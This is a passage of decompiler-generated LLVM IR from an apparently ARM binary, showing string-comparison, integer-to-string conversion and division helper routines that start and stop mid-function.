  %v1_12874 = add i32 %v0_12874, 1
  %v2_12878 = add i32 %v1_12874, %tmp
  %v3_12878 = inttoptr i32 %v2_12878 to i8*
  %v4_12878 = load i8, i8* %v3_12878, align 1
  %v2_1287c = icmp eq i8 %v4_12878, 0
  br i1 %v2_1287c, label %dec_label_pc_12884, label %dec_label_pc_12874

dec_label_pc_12884:                               ; preds = %dec_label_pc_12874, %bb
  %v0_128d03 = phi i32 [ %v3_12860, %bb ], [ %v1_12874, %dec_label_pc_12874 ]
  %v1_12884 = inttoptr i32 %arg2 to i8*
  %v2_12884 = load i8, i8* %v1_12884, align 1
  %v3_12884 = zext i8 %v2_12884 to i32
  store i32 %v3_12884, i32* @r3, align 4
  %v2_12888 = icmp eq i8 %v2_12884, 0
  br i1 %v2_12888, label %bb21, label %dec_label_pc_12894

bb21:                                             ; preds = %dec_label_pc_12884
  store i32 %v3_12884, i32* @r2, align 4
  br label %dec_label_pc_128a8

dec_label_pc_12894:                               ; preds = %dec_label_pc_12884
  br label %dec_label_pc_12898

dec_label_pc_12898:                               ; preds = %dec_label_pc_12898, %dec_label_pc_12894
  %v0_12898 = phi i32 [ %v1_12898, %dec_label_pc_12898 ], [ 0, %dec_label_pc_12894 ]
  %v1_12898 = add i32 %v0_12898, 1
  store i32 %v1_12898, i32* @r2, align 4
  %v2_1289c = add i32 %v1_12898, %arg2
  %v3_1289c = inttoptr i32 %v2_1289c to i8*
  %v4_1289c = load i8, i8* %v3_1289c, align 1
  %v6_1289c = zext i8 %v4_1289c to i32
  store i32 %v6_1289c, i32* @r3, align 4
  %v2_128a0 = icmp eq i8 %v4_1289c, 0
  br i1 %v2_128a0, label %dec_label_pc_128a8, label %dec_label_pc_12898

dec_label_pc_128a8:                               ; preds = %dec_label_pc_12898, %bb21
  %v1_128a8 = phi i32 [ %v3_12884, %bb21 ], [ %v1_12898, %dec_label_pc_12898 ]
  %v9_128a8 = icmp eq i32 %v0_128d03, %v1_128a8
  br i1 %v9_128a8, label %dec_label_pc_128d0.preheader, label %dec_label_pc_128b0

dec_label_pc_128d0.preheader:                     ; preds = %dec_label_pc_128a8
  %v2_128d05 = icmp eq i32 %v0_128d03, 0
  br i1 %v2_128d05, label %dec_label_pc_128d8, label %dec_label_pc_128b8

dec_label_pc_128b0:                               ; preds = %dec_label_pc_128b8, %dec_label_pc_128a8
  ret i32 0

dec_label_pc_128b8:                               ; preds = %dec_label_pc_128c8, %dec_label_pc_128d0.preheader
  %v0_128d0.in = phi i32 [ %v0_128d0, %dec_label_pc_128c8 ], [ %v0_128d03, %dec_label_pc_128d0.preheader ]
  %v0_128cc = phi i32 [ %v1_128cc, %dec_label_pc_128c8 ], [ %arg2, %dec_label_pc_128d0.preheader ]
  %v0_128c8 = phi i32 [ %v1_128c8, %dec_label_pc_128c8 ], [ %tmp, %dec_label_pc_128d0.preheader ]
  %v0_128d0 = add i32 %v0_128d0.in, -1
  %v1_128b8 = inttoptr i32 %v0_128c8 to i8*
  %v2_128b8 = load i8, i8* %v1_128b8, align 1
  %v3_128b8 = zext i8 %v2_128b8 to i32
  store i32 %v3_128b8, i32* @r2, align 4
  %v1_128bc = inttoptr i32 %v0_128cc to i8*
  %v2_128bc = load i8, i8* %v1_128bc, align 1
  %v3_128bc = zext i8 %v2_128bc to i32
  store i32 %v3_128bc, i32* @r3, align 4
  %v9_128c0 = icmp eq i8 %v2_128b8, %v2_128bc
  br i1 %v9_128c0, label %dec_label_pc_128c8, label %dec_label_pc_128b0

dec_label_pc_128c8:                               ; preds = %dec_label_pc_128b8
  %v1_128c8 = add i32 %v0_128c8, 1
  %v1_128cc = add i32 %v0_128cc, 1
  %v2_128d0 = icmp eq i32 %v0_128d0, 0
  br i1 %v2_128d0, label %dec_label_pc_128d8, label %dec_label_pc_128b8

dec_label_pc_128d8:                               ; preds = %dec_label_pc_128c8, %dec_label_pc_128d0.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_12898, { 0, 1, 3, 2 }
  uselistorder i8 %v2_12860, { 1, 0 }
}

define i32 @function_128e0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_128e0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_128e4 = load i8, i8* %arg1, align 1
  %v2_128e8 = icmp eq i8 %v2_128e4, 0
  %v0_128ec = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_128e8, label %bb, label %dec_label_pc_128f8

bb:                                               ; preds = %dec_label_pc_128e0
  %v3_128e4 = zext i8 %v2_128e4 to i32
  br label %dec_label_pc_1290c

dec_label_pc_128f8:                               ; preds = %dec_label_pc_128e0
  br label %dec_label_pc_128fc

dec_label_pc_128fc:                               ; preds = %dec_label_pc_128fc, %dec_label_pc_128f8
  %v0_128fc = phi i32 [ %v1_128fc, %dec_label_pc_128fc ], [ 0, %dec_label_pc_128f8 ]
  %v1_128fc = add i32 %v0_128fc, 1
  %v2_12900 = add i32 %v1_128fc, %tmp
  %v3_12900 = inttoptr i32 %v2_12900 to i8*
  %v4_12900 = load i8, i8* %v3_12900, align 1
  %v2_12904 = icmp eq i8 %v4_12900, 0
  br i1 %v2_12904, label %dec_label_pc_1290c, label %dec_label_pc_128fc

dec_label_pc_1290c:                               ; preds = %dec_label_pc_128fc, %bb
  %v6_12934 = phi i32 [ %v3_128e4, %bb ], [ %v1_128fc, %dec_label_pc_128fc ]
  %v0_1290c = load i32, i32* %r1.global-to-local, align 4
  %v1_1290c = inttoptr i32 %v0_1290c to i8*
  %v2_1290c = load i8, i8* %v1_1290c, align 1
  %v3_1290c = zext i8 %v2_1290c to i32
  %v2_12910 = icmp eq i8 %v2_1290c, 0
  br i1 %v2_12910, label %bb26, label %dec_label_pc_1291c

bb26:                                             ; preds = %dec_label_pc_1290c
  store i32 %v3_1290c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12930

dec_label_pc_1291c:                               ; preds = %dec_label_pc_1290c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12920

dec_label_pc_12920:                               ; preds = %dec_label_pc_12920, %dec_label_pc_1291c
  %v0_12920 = phi i32 [ %v1_12920, %dec_label_pc_12920 ], [ 0, %dec_label_pc_1291c ]
  %v1_12920 = add i32 %v0_12920, 1
  store i32 %v1_12920, i32* %r2.global-to-local, align 4
  %v2_12924 = add i32 %v1_12920, %v0_1290c
  %v3_12924 = inttoptr i32 %v2_12924 to i8*
  %v4_12924 = load i8, i8* %v3_12924, align 1
  %v2_12928 = icmp eq i8 %v4_12924, 0
  br i1 %v2_12928, label %dec_label_pc_12930, label %dec_label_pc_12920

dec_label_pc_12930:                               ; preds = %dec_label_pc_12920, %bb26
  %v0_12930 = phi i32 [ %v3_1290c, %bb26 ], [ %v1_12920, %dec_label_pc_12920 ]
  %v2_12930 = sub i32 %v0_12930, %v0_128ec
  %v4_12930 = xor i32 %v0_12930, %v0_128ec
  %v5_12930 = xor i32 %v2_12930, %v0_12930
  %v6_12930 = and i32 %v5_12930, %v4_12930
  %v5_12934 = icmp slt i32 %v0_12930, %v0_128ec
  br i1 %v5_12934, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_12930
  %v8_12934 = sub i32 %v6_12934, %v0_128ec
  %v10_12934 = xor i32 %v6_12934, %v0_128ec
  %v11_12934 = xor i32 %v8_12934, %v6_12934
  %v12_12934 = and i32 %v11_12934, %v10_12934
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_12930, %bb27
  %v1_12938.in = phi i32 [ %v6_12930, %dec_label_pc_12930 ], [ %v12_12934, %bb27 ]
  %v0_12938.in = phi i32 [ %v2_12930, %dec_label_pc_12930 ], [ %v8_12934, %bb27 ]
  %v0_12938 = icmp slt i32 %v0_12938.in, 0
  %v1_12938 = icmp slt i32 %v1_12938.in, 0
  %v2_12938 = xor i1 %v1_12938, %v0_12938
  br i1 %v2_12938, label %dec_label_pc_12964, label %dec_label_pc_12948.preheader

dec_label_pc_12948.preheader:                     ; preds = %bb28
  %v2_129485 = icmp eq i32 %v0_128ec, 0
  br i1 %v2_129485, label %dec_label_pc_12964, label %dec_label_pc_12950

dec_label_pc_12940:                               ; preds = %dec_label_pc_12950
  %v1_12940 = add i32 %v0_12940, 1
  %v1_12944 = add i32 %v0_12944, 1
  store i32 %v1_12944, i32* %r1.global-to-local, align 4
  %v2_12948 = icmp eq i32 %v0_12948, 0
  br i1 %v2_12948, label %dec_label_pc_12964, label %dec_label_pc_12950

dec_label_pc_12950:                               ; preds = %dec_label_pc_12940, %dec_label_pc_12948.preheader
  %v0_12948.in = phi i32 [ %v0_12948, %dec_label_pc_12940 ], [ %v0_128ec, %dec_label_pc_12948.preheader ]
  %v0_12944 = phi i32 [ %v1_12944, %dec_label_pc_12940 ], [ %v0_1290c, %dec_label_pc_12948.preheader ]
  %v0_12940 = phi i32 [ %v1_12940, %dec_label_pc_12940 ], [ %tmp, %dec_label_pc_12948.preheader ]
  %v0_12948 = add i32 %v0_12948.in, -1
  %v1_12950 = inttoptr i32 %v0_12940 to i8*
  %v2_12950 = load i8, i8* %v1_12950, align 1
  %v3_12950 = zext i8 %v2_12950 to i32
  store i32 %v3_12950, i32* %r2.global-to-local, align 4
  %v1_12954 = inttoptr i32 %v0_12944 to i8*
  %v2_12954 = load i8, i8* %v1_12954, align 1
  %v9_12958 = icmp eq i8 %v2_12950, %v2_12954
  br i1 %v9_12958, label %dec_label_pc_12940, label %dec_label_pc_12964

dec_label_pc_12964:                               ; preds = %dec_label_pc_12940, %dec_label_pc_12948.preheader, %dec_label_pc_12950, %bb28
  %storemerge = phi i32 [ 0, %bb28 ], [ 1, %dec_label_pc_12948.preheader ], [ 1, %dec_label_pc_12940 ], [ 0, %dec_label_pc_12950 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_12940, { 1, 0 }
  uselistorder i32 %v0_12944, { 1, 0 }
  uselistorder i32 %v0_12930, { 3, 0, 1, 2 }
  uselistorder i32 %v1_12920, { 0, 1, 3, 2 }
  uselistorder i32 %v0_128ec, { 0, 3, 1, 4, 6, 2, 5 }
  uselistorder i8 %v2_128e4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12964, { 2, 0, 1, 3 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_12974(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12974:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v3_12974 = load i32, i32* @r4, align 4
  %v12_12974 = load i32, i32* @r7, align 4
  %v0_12978 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12978, i32* %r8.global-to-local, align 4
  %v2_12978 = icmp eq i32 %v0_12978, 0
  store i1 %v2_12978, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_12978, label %dec_label_pc_12a58, label %dec_label_pc_12988

dec_label_pc_12988:                               ; preds = %dec_label_pc_12974
  %v3_12988 = icmp eq i8 %arg1, 0
  store i1 %v3_12988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12988, label %.thread, label %dec_label_pc_1299c

.thread:                                          ; preds = %dec_label_pc_12988
  %v4_12990 = inttoptr i32 %v0_12978 to i8*
  store i8 48, i8* %v4_12990, align 1
  %v0_12994.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12994.pr.pr, label %.thread1, label %dec_label_pc_1299c

.thread1:                                         ; preds = %.thread
  %v4_12994 = load i32, i32* %r8.global-to-local, align 4
  %v5_12994 = add i32 %v4_12994, 1
  %v6_12994 = inttoptr i32 %v5_12994 to i8*
  store i8 0, i8* %v6_12994, align 1
  %v0_12998.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12998.pr.pr, label %dec_label_pc_12a58, label %dec_label_pc_1299c

dec_label_pc_1299c:                               ; preds = %dec_label_pc_12988, %.thread, %.thread1
  %tmp47 = icmp slt i8 %arg1, 0
  %v7_129a0 = icmp eq i32 %arg2, 10
  store i1 %v7_129a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129a0, label %bb, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_1299c
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_1299c
  %v4_1299c = zext i1 %tmp47 to i32
  store i32 %v4_1299c, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp47, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_129c08 = sub nsw i32 0, %tmp
  %tmp.v3_129c08 = select i1 %phitmp, i32 %tmp, i32 %v3_129c08
  %tmp46 = zext i1 %phitmp to i32
  %. = xor i32 %tmp46, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread28
  %storemerge30 = phi i32 [ %tmp, %.thread28 ], [ %tmp.v3_129c08, %bb ]
  %storemerge = phi i32 [ 0, %.thread28 ], [ %., %bb ]
  store i32 %storemerge30, i32* @r4, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_129cc = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_129cc, i32* @r7, align 4
  br label %dec_label_pc_129d0

dec_label_pc_129d0:                               ; preds = %bb45, %.thread6
  %v0_129d0 = phi i32 [ %v0_129f4, %bb45 ], [ %storemerge30, %.thread6 ]
  store i32 %v0_129d0, i32* %r0.global-to-local, align 4
  %v0_129d4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_129d4, i32* %r1.global-to-local, align 4
  %sext = mul i32 %v0_129d0, 16777216
  %v1_129d8 = sdiv i32 %sext, 16777216
  %v3_129d8 = call i32 @function_12b6c(i32 %v1_129d8, i32 %v0_129d4)
  %v7_129dc = icmp eq i32 %v0_129d4, 9
  store i1 %v7_129dc, i1* %cpsr_z.global-to-local, align 1
  %v1_129e0 = add i32 %v0_129d4, 48
  %v0_129e4 = load i32, i32* @r4, align 4
  store i32 %v0_129e4, i32* @r0, align 4
  %v7_129e8 = icmp sgt i32 %v0_129d4, 9
  %extract.t = trunc i32 %v1_129e0 to i8
  br i1 %v7_129e8, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_129d0
  %v9_129e8 = add i32 %v0_129d4, 55
  %extract.t27 = trunc i32 %v9_129e8 to i8
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_129d0, %bb44
  %v0_129f0.off0 = phi i8 [ %extract.t, %dec_label_pc_129d0 ], [ %extract.t27, %bb44 ]
  %v0_129ec = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_129ec, i32* @r1, align 4
  %v2_129f0 = load i32, i32* %r5.global-to-local, align 4
  %v3_129f0 = load i32, i32* @r7, align 4
  %v4_129f0 = add i32 %v3_129f0, %v2_129f0
  %v5_129f0 = inttoptr i32 %v4_129f0 to i8*
  store i8 %v0_129f0.off0, i8* %v5_129f0, align 1
  %v0_129f4 = call i32 @function_12a70()
  store i32 %v0_129f4, i32* %r0.global-to-local, align 4
  store i32 %v0_129f4, i32* @r4, align 4
  %v2_129f8 = icmp eq i32 %v0_129f4, 0
  store i1 %v2_129f8, i1* %cpsr_z.global-to-local, align 1
  %v0_129fc = load i32, i32* %r5.global-to-local, align 4
  %v1_129fc = add i32 %v0_129fc, -1
  store i32 %v1_129fc, i32* %r5.global-to-local, align 4
  br i1 %v2_129f8, label %dec_label_pc_12a04, label %dec_label_pc_129d0

dec_label_pc_12a04:                               ; preds = %bb45
  %v0_12a04 = load i32, i32* %sl.global-to-local, align 4
  %v2_12a04 = icmp eq i32 %v0_12a04, 0
  store i1 %v2_12a04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12a04, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_12a04
  %v3_12a08 = ptrtoint i32* %stack_var_-32 to i32
  %v3_12a0c = add i32 %v1_129fc, %v3_12a08
  store i32 %v3_12a0c, i32* %r2.global-to-local, align 4
  %v4_12a14 = add i32 %v3_12a0c, -34
  %v5_12a14 = inttoptr i32 %v4_12a14 to i8*
  store i8 45, i8* %v5_12a14, align 1
  %v0_12a18.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_12a18.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_12a18.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_12a04
  %v1_12a18 = phi i32 [ %v1_129fc, %dec_label_pc_12a04 ], [ %v1_12a18.pre, %.thread11 ]
  %v2_12a18 = add i32 %v1_12a18, 1
  store i32 %v2_12a18, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_12a24 = phi i32 [ %v2_12a18, %.thread12 ], [ %v1_12a18.pre, %.thread11 ]
  %v0_12a1c = load i32, i32* @r7, align 4
  %v2_12a1c = add i32 %v0_12a1c, %v1_12a24
  %v3_12a1c = inttoptr i32 %v2_12a1c to i8*
  %v4_12a1c = load i8, i8* %v3_12a1c, align 1
  %v6_12a1c = zext i8 %v4_12a1c to i32
  %v2_12a20 = icmp eq i8 %v4_12a1c, 0
  store i1 %v2_12a20, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_12a1c, i32* %r2.global-to-local, align 4
  br i1 %v2_12a20, label %dec_label_pc_12a68, label %dec_label_pc_12a30.preheader

dec_label_pc_12a30.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12a30

dec_label_pc_12a30:                               ; preds = %dec_label_pc_12a30.preheader, %dec_label_pc_12a30
  %v0_12a30 = phi i32 [ 0, %dec_label_pc_12a30.preheader ], [ %v1_12a30, %dec_label_pc_12a30 ]
  %v1_12a30 = add i32 %v0_12a30, 1
  store i32 %v1_12a30, i32* %r1.global-to-local, align 4
  %v2_12a34 = add i32 %v1_12a30, %v2_12a1c
  %v3_12a34 = inttoptr i32 %v2_12a34 to i8*
  %v4_12a34 = load i8, i8* %v3_12a34, align 1
  %v2_12a38 = icmp eq i8 %v4_12a34, 0
  store i1 %v2_12a38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12a38, label %dec_label_pc_12a40, label %dec_label_pc_12a30

dec_label_pc_12a40:                               ; preds = %dec_label_pc_12a30, %dec_label_pc_12a68
  %v0_12a4424 = phi i32 [ %v6_12a1c, %dec_label_pc_12a68 ], [ %v1_12a30, %dec_label_pc_12a30 ]
  %v0_12a40 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_12a40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a44

dec_label_pc_12a44:                               ; preds = %dec_label_pc_12a44.dec_label_pc_12a44_crit_edge, %dec_label_pc_12a40
  %v2_12a50 = phi i32 [ %v5_12a50, %dec_label_pc_12a44.dec_label_pc_12a44_crit_edge ], [ %v0_12a40, %dec_label_pc_12a40 ]
  %v0_12a48 = phi i32 [ %v0_12a48.pre, %dec_label_pc_12a44.dec_label_pc_12a44_crit_edge ], [ %v2_12a1c, %dec_label_pc_12a40 ]
  %v0_12a44 = phi i32 [ %v0_12a44.pre, %dec_label_pc_12a44.dec_label_pc_12a44_crit_edge ], [ %v0_12a4424, %dec_label_pc_12a40 ]
  %v1_12a44 = add i32 %v0_12a44, -1
  store i32 %v1_12a44, i32* %r1.global-to-local, align 4
  %v1_12a48 = inttoptr i32 %v0_12a48 to i8*
  %v2_12a48 = load i8, i8* %v1_12a48, align 1
  %v5_12a48 = add i32 %v0_12a48, 1
  store i32 %v5_12a48, i32* %r2.global-to-local, align 4
  %v3_12a4c = icmp eq i32 %v0_12a44, 0
  store i1 %v3_12a4c, i1* %cpsr_z.global-to-local, align 1
  %v3_12a50 = inttoptr i32 %v2_12a50 to i8*
  store i8 %v2_12a48, i8* %v3_12a50, align 1
  %v4_12a50 = load i32, i32* %r0.global-to-local, align 4
  %v5_12a50 = add i32 %v4_12a50, 1
  store i32 %v5_12a50, i32* %r0.global-to-local, align 4
  br i1 %v3_12a4c, label %dec_label_pc_12a58, label %dec_label_pc_12a44.dec_label_pc_12a44_crit_edge

dec_label_pc_12a44.dec_label_pc_12a44_crit_edge:  ; preds = %dec_label_pc_12a44
  %v0_12a44.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_12a48.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12a44

dec_label_pc_12a58:                               ; preds = %dec_label_pc_12a44, %.thread1, %dec_label_pc_12974
  %v0_12a58 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_12a58, i32* %r0.global-to-local, align 4
  store i32 %v3_12974, i32* @r4, align 4
  store i32 %v12_12974, i32* @r7, align 4
  ret i32 %v0_12a58

dec_label_pc_12a68:                               ; preds = %.thread11._crit_edge
  store i32 %v6_12a1c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12a40

; uselistorder directives
  uselistorder i32 %v5_12a50, { 1, 0 }
  uselistorder i1 %v3_12a4c, { 1, 0 }
  uselistorder i32 %v0_12a48, { 1, 0 }
  uselistorder i32 %v1_12a30, { 0, 1, 3, 2 }
  uselistorder i32 %v6_12a1c, { 1, 0 }
  uselistorder i32 %v2_12a1c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12a18.pre, { 1, 0 }
  uselistorder i32 %v1_129fc, { 1, 0, 2 }
  uselistorder i32 %v0_129f4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_129d4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_12978, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12a40, { 1, 0 }
  uselistorder label %dec_label_pc_12a30, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_1299c, { 2, 1, 0 }
}

define i32 @function_12a70() local_unnamed_addr {
dec_label_pc_12a70:
  %r2.global-to-local = alloca i32, align 4
  %v0_12a70 = load i32, i32* @r1, align 4
  %v1_12a70 = add i32 %v0_12a70, -1
  store i32 %v1_12a70, i32* %r2.global-to-local, align 4
  %v2_12a70 = icmp eq i32 %v0_12a70, 0
  %v7_12a70 = icmp eq i32 %v0_12a70, 1
  %v0_12a74 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_12a70, i32 %v0_12a74)
  br i1 %v2_12a70, label %dec_label_pc_12b58, label %dec_label_pc_12a7c

dec_label_pc_12a7c:                               ; preds = %dec_label_pc_12a70
  %v0_12a7c = load i32, i32* @r0, align 4
  %v1_12a7c = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_12a7c, %v1_12a7c
  br i1 %tmp, label %dec_label_pc_12a84, label %dec_label_pc_12b10

dec_label_pc_12a84:                               ; preds = %dec_label_pc_12a7c
  %v1_12a84 = load i32, i32* %r2.global-to-local, align 4
  %v2_12a84 = and i32 %v1_12a84, %v1_12a7c
  %v4_12a84 = icmp eq i32 %v2_12a84, 0
  br i1 %v4_12a84, label %dec_label_pc_12b1c, label %dec_label_pc_12a8c

dec_label_pc_12a8c:                               ; preds = %dec_label_pc_12a84
  %v3_12a8c = icmp ult i32 %v1_12a7c, 536870912
  br i1 %v3_12a8c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_12a8c
  %v4_12a90 = mul i32 %v1_12a7c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_12a8c, %.thread
  %v0_12ab0.pr36.ph = phi i32 [ %v4_12a90, %.thread ], [ %v1_12a7c, %dec_label_pc_12a8c ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_12a8c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_12ab0.pr36 = phi i32 [ %v4_12aa4, %bb81 ], [ %v0_12ab0.pr36.ph, %.preheader.preheader ]
  %v1_12aa8 = phi i32 [ %v4_12aa8, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_12a9c = icmp ugt i32 %v0_12ab0.pr36, 268435455
  br i1 %v2_12a9c, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_12ab0thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_12aa0 = icmp ult i32 %v0_12ab0.pr36, %v0_12a7c
  br i1 %v4_12aa0, label %bb80, label %dec_label_pc_12ab0thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_12aa4 = and i32 %v0_12ab0.pr36, 268435456
  %v3_12aa4 = icmp eq i32 %v2_12aa4, 0
  %v4_12aa4 = mul i32 %v0_12ab0.pr36, 16
  br i1 %v3_12aa4, label %bb81, label %dec_label_pc_12ab0.loopexit

bb81:                                             ; preds = %bb80
  %v2_12aa8 = and i32 %v1_12aa8, 268435456
  %v3_12aa8 = icmp eq i32 %v2_12aa8, 0
  %v4_12aa8 = mul i32 %v1_12aa8, 16
  br i1 %v3_12aa8, label %.preheader, label %dec_label_pc_12ab0thread-pre-split.loopexit.loopexit

dec_label_pc_12ab0thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_12abc48.ph = phi i32 [ %v1_12aa8, %bb ], [ %v4_12aa8, %bb81 ]
  %v0_12ab0.pr38.ph = phi i32 [ %v0_12ab0.pr36, %bb ], [ %v4_12aa4, %bb81 ]
  br label %dec_label_pc_12ab0thread-pre-split.loopexit

dec_label_pc_12ab0thread-pre-split.loopexit:      ; preds = %dec_label_pc_12ab0thread-pre-split.loopexit.loopexit, %.thread2
  %v1_12abc48 = phi i32 [ %v1_12aa8, %.thread2 ], [ %v1_12abc48.ph, %dec_label_pc_12ab0thread-pre-split.loopexit.loopexit ]
  %v0_12ab0.pr38 = phi i32 [ %v0_12ab0.pr36, %.thread2 ], [ %v0_12ab0.pr38.ph, %dec_label_pc_12ab0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12ab0thread-pre-split

dec_label_pc_12ab0thread-pre-split:               ; preds = %dec_label_pc_12ab0thread-pre-split.loopexit, %bb83
  %v1_12abc46 = phi i32 [ %v1_12abc48, %dec_label_pc_12ab0thread-pre-split.loopexit ], [ %v3_12abc, %bb83 ]
  %v0_12ab0.pr = phi i32 [ %v0_12ab0.pr38, %dec_label_pc_12ab0thread-pre-split.loopexit ], [ %v3_12ab8, %bb83 ]
  br label %dec_label_pc_12ab0

dec_label_pc_12ab0.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_12ab0

dec_label_pc_12ab0:                               ; preds = %dec_label_pc_12ab0.loopexit, %dec_label_pc_12ab0thread-pre-split
  %v1_12abc = phi i32 [ %v1_12abc46, %dec_label_pc_12ab0thread-pre-split ], [ %v1_12aa8, %dec_label_pc_12ab0.loopexit ]
  %v1_12ab8 = phi i32 [ %v0_12ab0.pr, %dec_label_pc_12ab0thread-pre-split ], [ %v4_12aa4, %dec_label_pc_12ab0.loopexit ]
  %v2_12ab0 = icmp slt i32 %v1_12ab8, 0
  br i1 %v2_12ab0, label %dec_label_pc_12ac4, label %bb82

bb82:                                             ; preds = %dec_label_pc_12ab0
  %v4_12ab4 = icmp ult i32 %v1_12ab8, %v0_12a7c
  br i1 %v4_12ab4, label %bb83, label %dec_label_pc_12ac4

bb83:                                             ; preds = %bb82
  %v3_12ab8 = mul i32 %v1_12ab8, 2
  %v2_12abc = icmp slt i32 %v1_12abc, 0
  %v3_12abc = mul i32 %v1_12abc, 2
  br i1 %v2_12abc, label %dec_label_pc_12ac4, label %dec_label_pc_12ab0thread-pre-split

dec_label_pc_12ac4:                               ; preds = %bb82, %dec_label_pc_12ab0, %bb83
  %v2_12ad059 = phi i32 [ %v3_12abc, %bb83 ], [ %v1_12abc, %bb82 ], [ %v1_12abc, %dec_label_pc_12ab0 ]
  %v1_12ac851 = phi i32 [ %v3_12ab8, %bb83 ], [ %v1_12ab8, %bb82 ], [ %v1_12ab8, %dec_label_pc_12ab0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12ac8

dec_label_pc_12ac8:                               ; preds = %.thread11, %dec_label_pc_12ac4
